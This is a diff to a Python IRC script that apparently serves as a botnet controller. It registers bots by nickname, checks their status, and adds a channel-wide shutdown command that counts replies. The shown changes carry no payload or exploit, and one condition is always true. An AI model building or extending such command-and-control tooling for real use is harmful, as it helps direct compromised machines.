@@ -12,6 +12,20 @@ PASS = ''
 BOTS = []
 
 '''
+    shutdown(sender, overflow)
+    sender - message sender
+    overflow - actual message received from buffer (handles overflowing messages due to concurrency)
+'''
+def shutdown(sender, overflow):
+    if sender in BOTS:
+        print(sender + " shutting down")
+        BOTS.remove(sender)
+    if "PRIVMSG" in overflow:
+        (prefix, command, args) = parsemsg(':'+overflow.split(':',1)[1])
+        sender = prefix.split("!")[0]
+        shutdown(sender, args[1])
+    return
+'''
     checks for bot status every 5s
 '''
 def status_check():
@@ -69,9 +83,9 @@ def generate_nickname(length):
 def recv():
     while not QUIT:
         response = s.recv(1024).decode("utf-8")
+        #print(response)
 
         if 'PING' in response:
-            print(response)
             msg = response.split(':')
             print('PONG '+msg[1]+'\r\n')
             s.send(('PONG '+msg[1]+'\r\n').encode("utf-8"))
@@ -81,6 +95,7 @@ def recv():
             # args[1].strip() = message
             (prefix, command, args)= parsemsg(response)
             sender = prefix.split("!")[0]
+
             #print("Sender: "+sender)
             ## debug msgs
             #print("prefix: " + prefix)
@@ -92,16 +107,15 @@ def recv():
             if command == "433":
                 NICK = 'controller_'+generate_nickname(5)
                 s.send(("NICK "+NICK+"\r\n").encode('utf-8'))
-            # check for bot quitting
-            elif command == "QUIT":
-                print(sender+" quit! Updating BOTS...")
-                BOTS.remove(sender)
-                print(BOTS)
+
             elif command == "PRIVMSG":
+
                 # if msg is a bot nickname
-                if "bot_" in args[1].strip():
-                    handle_bot_status(sender, args[1])
-                    
+                if "bot_" in args[1] and sender not in BOTS:
+                    if sender != ' ' or sender != '':
+                        handle_bot_status(sender, args[1])
+                if "shutting down" in args[1]:
+                    shutdown(sender, args[1])
     return
 
 def send():
@@ -121,6 +135,13 @@ def send():
             print("Found %d bots:"%len(BOTS))
             for b in BOTS:
                 print(b)
+        elif msg == "shutdown":
+            bots_before = len(BOTS)
+            s.send(privmsg(CHAN, "shutdown").encode('utf-8'))
+            # wait for bot reply for 5s
+            time.sleep(5)
+            bots_after = bots_before - len(BOTS)
+            print("Total: %d bots shut down"%bots_after)
         else:
             print("Sending "+privmsg(CHAN, msg))
             s.send(privmsg(CHAN, msg).encode('utf-8'))
